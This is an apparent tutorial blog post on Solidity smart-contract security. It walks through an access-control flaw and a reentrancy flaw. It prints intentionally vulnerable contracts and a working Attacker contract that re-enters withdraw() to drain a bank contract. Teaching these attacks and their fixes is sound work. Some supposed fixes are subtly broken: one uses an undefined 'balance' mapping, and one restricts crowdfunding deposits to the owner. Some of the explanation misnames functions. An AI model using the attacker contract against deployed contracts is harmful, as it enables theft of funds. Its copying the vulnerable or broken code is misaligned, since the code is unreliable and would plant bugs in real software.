---
title: "Smart Contract Security - Access Control & Reentrancy Attack"
seoTitle: "Smart Contract Security"
datePublished: Thu Apr 27 2023 10:32:45 GMT+0000 (Coordinated Universal Time)
cuid: clgyzkoy7000r09mhhy8nbs2s
slug: smart-contract-security-access-control-reentrancy-attack
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1682591496543/f77951f1-8770-4a95-bf11-764fd2d072f5.png
tags: security, blockchain, ethereum, solidity, smart-contracts

---

# Introduction

Web3 and smart contracts are certainly a part of the future of technology, but their success will depend on the ability of developers and industry leaders to address these challenges and build robust, user-friendly applications that can deliver on the promise of these exciting new technologies.

However, like any software, smart contracts can contain vulnerabilities that can be exploited by attackers. Smart contract security is therefore a critical concern for anyone using these contracts.

In this blog, let's learn how we are going to mitigate common security vulnerabilities using access control and avoiding Reentrancy attack.

# What are smart contracts?

Smart contracts are self-executing agreements that are stored on a blockchain. They are designed to automatically execute when certain conditions are met, making them a popular tool for automating transactions, agreements, and other functions.

## Solidity Programming Language

Smart contracts are typically written in Solidity, a programming language specific to Ethereum, the most popular blockchain for smart contracts. It is designed to be secure, but like any programming language, it is possible to write insecure code. Developers who are working with Solidity should be aware of common vulnerabilities and best practices for writing secure smart contracts.

# Access Control

Access control refers to determining who has access to which part of your program. In particular, who has permission to invoke certain functions in your code.

Let's have a look at the example code given below:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "@openzeppelin/contracts/utils/Address.sol";

contract Crowdfunding {
    using Address for address payable; 

    mapping(address => uint) public balances;
    uint256 public totalFunds;

    constructor(){
        totalFunds = 0;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        totalFunds += msg.value;
    }

    function withdraw() public {
        payable(msg.sender).sendValue(totalFunds);
        totalFunds = 0;
    }
}
```

The above code is a simple crowdfunding contract, where everyone can deposit funds for supporting the owner of the contract. But, can you find the major flaw in the contract?

As you can see, every function is invokable by anyone accessing the contract, it is not restricted to the owner. That means anyone including the owner can call the withdraw function and drain the contract's funds. So, How we can fix that?

## The Solution

With the help of the concept of Access control, we can restrict the access of withdraw function to anyone but the owner.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "@openzeppelin/contracts/utils/Address.sol";

contract Crowdfunding {
    using Address for address payable; 

    mapping(address => uint) public balances;
    uint256 public totalFunds;
    address private owner;

    constructor(){
        owner = msg.sender;
        totalFunds = 0;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        totalFunds += msg.value;
    }

    function withdraw() public {
        require(owner == msg.sender, "Only the owner can update agreement terms.");
        payable(msg.sender).sendValue(totalFunds);
        totalFunds = 0;
    }
}
```

Additionally, we can use modifiers to restrict others to invoke multiple functions.

```solidity
 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "@openzeppelin/contracts/utils/Address.sol";

contract Crowdfunding {
    using Address for address payable;    

    mapping(address => uint) public balances;
    uint256 public totalFunds;
    address private owner;

    constructor(){
        owner = msg.sender;
        totalFunds = 0;
    }

    function deposit() public payable onlyOwner {
        balances[msg.sender] += msg.value;
        totalFunds += msg.value;
    }

    function withdraw() public onlyOwner {
        payable(msg.sender).sendValue(totalFunds);
        totalFunds = 0;
    }
    
      modifier onlyOwner() {
        require(owner == msg.sender, "Only the owner can update agreement terms.");
        _;
    }

}
```

Here, both the deposit and withdraw functions are restricted to the owner. Adding the modifier onlyOwner and adding them to both functions reduces code redundancy.

# Reentrancy Attack

A reentrancy attack allows an attacker to repeatedly enter a function in the contract before the previous invocation has been completed, potentially allowing the attacker to manipulate the contract in unintended ways and steal funds or other assets.

The vulnerability arises when a contract calls an external function that is not trusted, such as another contract or an external wallet. If the external function contains a call back to the original contract, the contract may be reentered before the previous invocation has been completed.

Let's have a look at the example code given below:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "@openzeppelin/contracts/utils/Address.sol";

contract EtherBank {
    using Address for address payable;

    // keeps track of all savings account balances
    mapping(address => uint) public balances;

    // deposit funds into the sender's account
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // withdraw all funds from the user's account
    function withdraw() external {
        require(balances[msg.sender] > 0, "Withdrawal amount exceeds available balance.");
        payable(msg.sender).sendValue(balances[msg.sender]);
        balances[msg.sender] = 0;
    }

    // check the total balance of the EtherBank contract
    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}
```

A simple contract, that works as a normal bank does with a simple deposit and withdraw function. Access control is also followed in this contract too.

Let's see how the attacker exploits the vulnerability of withdraw function with reference to his contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

interface IEtherBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IEtherBank public immutable etherBank;
    address private owner;

    constructor(address etherBankAddress) {
        etherBank = IEtherBank(etherBankAddress);
        owner = msg.sender;
    }

    function attack() external payable onlyOwner {
        etherBank.deposit{value: msg.value}();
        etherBank.withdraw();
    }

    receive() external payable {
        if (address(etherBank).balance > 0) {
            etherBank.withdraw();
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }

    // check the total balance of the Attacker contract
    function getBalance() external view returns (uint) {
        return address(this).balance;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Only the owner can attack.");
        _;
    } 
}
```

The attacker first calls the attack function to deposit some amount himself and calls the withdraw function. When the withdraw function is invoked in the victim contract, it tries to return the funds to the respective individual. But, here is the catch, before resetting the balance of the individual, the return() function of the attacker is called. Therefore, he can withdraw the same amount again as his balance is not being altered in the victim contract. A recursion of withdraw function occurs until the victim contract's funds are drained. So, How we can fix that?

## The Solution

We can store the amount to be payable in a secondary variable and reset it before the transaction even takes place. This ensures that the function can't be called the second time.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "@openzeppelin/contracts/utils/Address.sol";

contract EtherBank {
    using Address for address payable;

    // keeps track of all savings account balances
    mapping(address => uint) public balances;

    // deposit funds into the sender's account
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // withdraw all funds from the user's account
    function withdraw() external {
        require(balances[msg.sender] > 0, "Withdrawal amount exceeds available balance.");
        uint256 amount = balance[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amount);
    }

    // check the total balance of the EtherBank contract
    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}
```

Also, Openzeppelin provides ReentrancyGuard which mitigates the vulnerability without changing your legacy code. Just import the ReentranctGuard and mark the required function to be nonReentrant.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract EtherBank is ReentrancyGuard {
    using Address for address payable;

    // keeps track of all savings account balances
    mapping(address => uint) public balances;

    // deposit funds into the sender's account
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // withdraw all funds from the user's account
    function withdraw() external nonReentrant {
        require(balances[msg.sender] > 0, "Withdrawl amount exceeds available balance.");
        payable(msg.sender).sendValue(balances[msg.sender]);
        balances[msg.sender] = 0;
    }

    // check the total balance of the EtherBank contract
    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}
```

Hope you like this blog, leave a like if you made it this far :)